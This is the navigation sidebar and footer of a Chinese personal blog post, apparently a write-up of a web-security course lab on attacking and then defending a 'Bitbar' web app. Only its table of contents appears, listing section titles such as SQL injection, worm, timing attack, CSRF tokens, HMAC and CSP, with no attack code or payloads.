href="#%E5%AE%9E%E9%AA%8C%E6%AD%A5%E9%AA%A4-1"><span class="toc-number">1.5.4.2.</span> <span class="toc-text">实验步骤</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8Echo-%EF%BC%9ASQL-%E6%B3%A8%E5%85%A5"><span class="toc-number">1.5.5.</span> <span class="toc-text">漏洞利用Echo ：SQL 注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E4%BB%BB%E5%8A%A1%E8%AF%B4%E6%98%8E-3"><span class="toc-number">1.5.5.1.</span> <span class="toc-text">实验任务说明</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E5%8E%9F%E7%90%86-3"><span class="toc-number">1.5.5.2.</span> <span class="toc-text">实验原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E6%AD%A5%E9%AA%A4-2"><span class="toc-number">1.5.5.3.</span> <span class="toc-text">实验步骤</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8Foxtrot%EF%BC%9A%E7%AE%80%E4%BB%8B%E8%A0%95%E8%99%AB"><span class="toc-number">1.5.6.</span> <span class="toc-text">漏洞利用Foxtrot：简介蠕虫</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E4%BB%BB%E5%8A%A1%E8%AF%B4%E6%98%8E-4"><span class="toc-number">1.5.6.1.</span> <span class="toc-text">实验任务说明</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E5%8E%9F%E7%90%86-4"><span class="toc-number">1.5.6.2.</span> <span class="toc-text">实验原理</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Samy-Worm"><span class="toc-number">1.5.6.2.1.</span> <span class="toc-text">Samy Worm</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E6%AD%A5%E9%AA%A4-3"><span class="toc-number">1.5.6.3.</span> <span class="toc-text">实验步骤</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8Gamma-%EF%BC%9A%E9%80%9A%E8%BF%87%E6%97%B6%E5%BA%8F%E6%94%BB%E5%87%BB%E6%8F%90%E5%8F%96%E5%AF%86%E7%A0%81"><span class="toc-number">1.5.7.</span> <span class="toc-text">漏洞利用Gamma ：通过时序攻击提取密码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E4%BB%BB%E5%8A%A1%E8%AF%B4%E6%98%8E-5"><span class="toc-number">1.5.7.1.</span> <span class="toc-text">实验任务说明</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E5%8E%9F%E7%90%86-5"><span class="toc-number">1.5.7.2.</span> <span class="toc-text">实验原理</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%97%B6%E5%BA%8F%E6%94%BB%E5%87%BB"><span class="toc-number">1.5.7.2.1.</span> <span class="toc-text">时序攻击</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E6%AD%A5%E9%AA%A4-4"><span class="toc-number">1.5.7.3.</span> <span class="toc-text">实验步骤</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86%EF%BC%9A%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95"><span class="toc-number">1.6.</span> <span class="toc-text">第二部分：防御方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%B0%E5%9C%A8%E6%82%A8%E5%B7%B2%E7%BB%8F%E4%BA%86%E8%A7%A3-Bitbar-%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E5%88%B0%E5%BA%95%E6%9C%89%E5%A4%9A%E4%B8%8D%E5%AE%89%E5%85%A8%EF%BC%8C%E6%82%A8%E5%B0%86%E4%BF%AE%E6%94%B9%E8%AF%A5%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E4%BB%A5%E6%8A%B5%E5%BE%A1%E7%AC%AC-1-%E9%83%A8%E5%88%86%E4%B8%AD%E7%9A%84%E6%94%BB%E5%87%BB%EF%BC%88%E6%82%A8%E5%B0%86%E6%B0%B8%E8%BF%9C%E4%B8%8D%E4%BC%9A%E5%9C%A8%E8%87%AA%E5%B7%B1%E7%9A%84%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E4%B8%AD%E7%8A%AF%E8%BF%99%E4%BA%9B%E9%94%99%E8%AF%AF%EF%BC%81%EF%BC%89%E3%80%82%E6%AF%8F%E7%A7%8D%E6%94%BB%E5%87%BB%E7%9A%84%E5%AE%9E%E7%8E%B0%E6%96%B9%E6%B3%95%E5%8F%AF%E8%83%BD%E4%B8%8D%E6%AD%A2%E4%B8%80%E7%A7%8D%EF%BC%8C%E5%9B%A0%E6%AD%A4%E8%AF%B7%E8%80%83%E8%99%91%E5%85%B6%E4%BB%96%E5%8F%AF%E8%83%BD%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E2%80%93%E6%82%A8%E9%9C%80%E8%A6%81%E9%98%B2%E5%BE%A1%E6%89%80%E6%9C%89%E8%BF%99%E4%BA%9B%E6%96%B9%E6%B3%95%E3%80%82-%E6%8F%90%E7%A4%BA-%E5%A6%82%E6%9E%9C%E6%A3%80%E6%B5%8B%E5%88%B0-CSRF-%E6%88%96-cookie-%E8%A2%AB%E7%AF%A1%E6%94%B9%EF%BC%8C%E5%8F%AF%E4%BB%A5%E5%BC%BA%E5%88%B6%E6%B3%A8%E9%94%80%EF%BC%8C%E4%BD%86%E5%AF%B9%E4%BA%8E%E5%85%B6%E4%BB%96%E4%B8%8D%E8%89%AF%E8%BE%93%E5%85%A5%EF%BC%8C%E5%88%99%E5%BA%94%E6%98%BE%E7%A4%BA%E9%94%99%E8%AF%AF%E4%BF%A1%E6%81%AF%E3%80%82-%E5%9C%A8%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%9B%E7%A8%8B%E5%86%85%E5%AD%98%E4%B8%AD%E5%B0%86%E5%AF%86%E9%92%A5%E4%BD%9C%E4%B8%BA-JavaScript-%E5%8F%98%E9%87%8F%E6%98%AF%E5%8F%AF%E4%BB%A5%E6%8E%A5%E5%8F%97%E7%9A%84%E3%80%82-%E6%82%A8%E6%97%A0%E9%9C%80%E9%98%B2%E5%BE%A1-cookie-%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB%E3%80%82-%E7%94%B1%E4%BA%8E%E6%88%91%E4%BB%AC%E4%B8%8D%E8%A6%81%E6%B1%82%E6%82%A8%E4%BD%BF%E7%94%A8-TLS%EF%BC%8C%E5%9B%A0%E6%AD%A4%E6%82%A8%E5%8F%AF%E4%BB%A5%E8%AE%A4%E4%B8%BA-Cookie-%E4%B8%8D%E4%BC%9A%E8%A2%AB%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E8%80%85%E7%AA%83%E5%8F%96%E3%80%82-%E5%AE%9E%E7%8E%B0%E6%8F%90%E7%A4%BA-%E6%80%BB%E4%BD%93%E6%8F%90%E7%A4%BA-%E5%A6%82%E6%9E%9C%E6%A3%80%E6%B5%8B%E5%88%B0-CSRF-%E6%88%96-cookie-%E8%A2%AB%E7%AF%A1%E6%94%B9%EF%BC%8C%E5%8F%AF%E4%BB%A5%E5%BC%BA%E5%88%B6%E6%B3%A8%E9%94%80%EF%BC%8C%E4%BD%86%E5%AF%B9%E4%BA%8E%E5%85%B6%E4%BB%96%E4%B8%8D%E8%89%AF%E8%BE%93%E5%85%A5%EF%BC%8C%E5%88%99%E5%BA%94%E6%98%BE%E7%A4%BA%E9%94%99%E8%AF%AF%E4%BF%A1%E6%81%AF%E3%80%82-%E5%9C%A8%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%9B%E7%A8%8B%E5%86%85%E5%AD%98%E4%B8%AD%E5%B0%86%E5%AF%86%E9%92%A5%E4%BD%9C%E4%B8%BA-JavaScript-%E5%8F%98%E9%87%8F%E6%98%AF%E5%8F%AF%E4%BB%A5%E6%8E%A5%E5%8F%97%E7%9A%84%E3%80%82-%E6%82%A8%E6%97%A0%E9%9C%80%E9%98%B2%E5%BE%A1-cookie-%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB%E3%80%82-%E7%94%B1%E4%BA%8E%E6%88%91%E4%BB%AC%E4%B8%8D%E8%A6%81%E6%B1%82%E6%82%A8%E4%BD%BF%E7%94%A8-TLS%EF%BC%8C%E5%9B%A0%E6%AD%A4%E6%82%A8%E5%8F%AF%E4%BB%A5%E8%AE%A4%E4%B8%BA-Cookie-%E4%B8%8D%E4%BC%9A%E8%A2%AB%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E8%80%85%E7%AA%83%E5%8F%96%E3%80%82"><span class="toc-number">1.7.</span> <span class="toc-text">现在您已经了解 Bitbar 网络应用程序到底有多不安全，您将修改该应用程序以抵御第 1 部分中的攻击（您将永远不会在自己的网络应用程序中犯这些错误！）。每种攻击的实现方法可能不止一种，因此请考虑其他可能的攻击方法–您需要防御所有这些方法。### 提示- 如果检测到 CSRF 或 cookie 被篡改，可以强制注销，但对于其他不良输入，则应显示错误信息。- 在服务器进程内存中将密钥作为 JavaScript 变量是可以接受的。- 您无需防御 cookie 重放攻击。- 由于我们不要求您使用 TLS，因此您可以认为 Cookie 不会被网络攻击者窃取。### 实现提示#### 总体提示- 如果检测到 CSRF 或 cookie 被篡改，可以强制注销，但对于其他不良输入，则应显示错误信息。- 在服务器进程内存中将密钥作为 JavaScript 变量是可以接受的。- 您无需防御 cookie 重放攻击。- 由于我们不要求您使用 TLS，因此您可以认为 Cookie 不会被网络攻击者窃取。</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Alpha-%E9%98%B2%E5%BE%A1"><span class="toc-number">1.7.0.1.</span> <span class="toc-text">Alpha 防御</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Beta-%E9%98%B2%E5%BE%A1"><span class="toc-number">1.7.0.2.</span> <span class="toc-text">Beta 防御</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Foxtrot-%E9%98%B2%E5%BE%A1"><span class="toc-number">1.7.0.3.</span> <span class="toc-text">Foxtrot 防御</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E8%A6%81%E6%B1%82"><span class="toc-number">1.7.1.</span> <span class="toc-text">实现要求</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Alpha-%E9%98%B2%E5%BE%A1-1"><span class="toc-number">1.7.2.</span> <span class="toc-text">Alpha 防御</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BD%91%E9%A1%B5%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.7.2.1.</span> <span class="toc-text">网页漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%8C%E5%96%84"><span class="toc-number">1.7.2.2.</span> <span class="toc-text">代码完善</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Bravo-%E9%98%B2%E5%BE%A1"><span class="toc-number">1.7.3.</span> <span class="toc-text">Bravo 防御</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BD%91%E9%A1%B5%E6%BC%8F%E6%B4%9E-1"><span class="toc-number">1.7.3.1.</span> <span class="toc-text">网页漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95"><span class="toc-number">1.7.3.2.</span> <span class="toc-text">防御方法</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81-HTTP-Referer-%E5%AD%97%E6%AE%B5"><span class="toc-number">1.7.3.2.1.</span> <span class="toc-text">验证 HTTP Referer 字段</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9C%A8%E8%AF%B7%E6%B1%82%E5%9C%B0%E5%9D%80%E4%B8%AD%E6%B7%BB%E5%8A%A0-token-%E5%B9%B6%E9%AA%8C%E8%AF%81-Anti-CSRF-token"><span class="toc-number">1.7.3.2.2.</span> <span class="toc-text">在请求地址中添加 token 并验证(Anti-CSRF token)</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9C%A8-HTTP-%E5%A4%B4%E4%B8%AD%E8%87%AA%E5%AE%9A%E4%B9%89%E5%B1%9E%E6%80%A7%E5%B9%B6%E9%AA%8C%E8%AF%81"><span class="toc-number">1.7.3.2.3.</span> <span class="toc-text">在 HTTP 头中自定义属性并验证</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%8C%E5%96%84-1"><span class="toc-number">1.7.3.3.</span> <span class="toc-text">代码完善</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Charlie-%E5%92%8C-Delta-%E9%98%B2%E5%BE%A1"><span class="toc-number">1.7.4.</span> <span class="toc-text">Charlie 和 Delta 防御</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BD%91%E9%A1%B5%E6%BC%8F%E6%B4%9E-2"><span class="toc-number">1.7.4.1.</span> <span class="toc-text">网页漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95-1"><span class="toc-number">1.7.4.2.</span> <span class="toc-text">防御方法</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#HMAC"><span class="toc-number">1.7.4.2.1.</span> <span class="toc-text">HMAC</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%8C%E5%96%84-2"><span class="toc-number">1.7.4.3.</span> <span class="toc-text">代码完善</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Echo-%E9%98%B2%E5%BE%A1"><span class="toc-number">1.7.5.</span> <span class="toc-text">Echo 防御</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BD%91%E9%A1%B5%E6%BC%8F%E6%B4%9E-3"><span class="toc-number">1.7.5.1.</span> <span class="toc-text">网页漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95-2"><span class="toc-number">1.7.5.2.</span> <span class="toc-text">防御方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%8C%E5%96%84-3"><span class="toc-number">1.7.5.3.</span> <span class="toc-text">代码完善</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Foxtrot-%E9%98%B2%E5%BE%A1-1"><span class="toc-number">1.7.6.</span> <span class="toc-text">Foxtrot 防御</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BD%91%E9%A1%B5%E6%BC%8F%E6%B4%9E-4"><span class="toc-number">1.7.6.1.</span> <span class="toc-text">网页漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95-3"><span class="toc-number">1.7.6.2.</span> <span class="toc-text">防御方法</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5%EF%BC%88CSP%EF%BC%89"><span class="toc-number">1.7.6.2.1.</span> <span class="toc-text">内容安全策略（CSP）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%8C%E5%96%84-4"><span class="toc-number">1.7.6.2.2.</span> <span class="toc-text">代码完善</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Gamma-%E9%98%B2%E5%BE%A1"><span class="toc-number">1.7.7.</span> <span class="toc-text">Gamma 防御</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BD%91%E9%A1%B5%E6%BC%8F%E6%B4%9E-5"><span class="toc-number">1.7.7.1.</span> <span class="toc-text">网页漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E5%BC%8F"><span class="toc-number">1.7.7.2.</span> <span class="toc-text">防御方式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%8C%E5%96%84-5"><span class="toc-number">1.7.7.3.</span> <span class="toc-text">代码完善</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BF%83%E5%BE%97%E4%BD%93%E4%BC%9A"><span class="toc-number">1.8.</span> <span class="toc-text">心得体会</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/07/30/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9AWeb%20Attacks%20and%20Defenses/" title="网络安全（一）：Web Attacks and Defenses">网络安全（一）：Web Attacks and Defenses</a><time datetime="2024-07-30T01:07:48.000Z" title="Created 2024-07-30 09:07:48">2024-07-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/07/26/AI%E8%AF%AD%E9%9F%B3%E5%90%88%E6%88%90%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9A%E4%BD%BF%E7%94%A8GPT-SoVits%E8%BF%9B%E8%A1%8C%E6%97%A5%E5%B8%B8%E8%AF%B4%E8%AF%9D%E8%AF%AD%E9%9F%B3%E5%90%88%E6%88%90/" title="AI语音合成（一）：使用GPT-SoVits进行日常说话语音合成">AI语音合成（一）：使用GPT-SoVits进行日常说话语音合成</a><time datetime="2024-07-26T12:07:48.000Z" title="Created 2024-07-26 20:07:48">2024-07-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/06/27/hello-world/" title="Hello World">Hello World</a><time datetime="2024-06-27T05:23:12.563Z" title="Created 2024-06-27 13:23:12">2024-06-27</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By Zhu Siqi</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>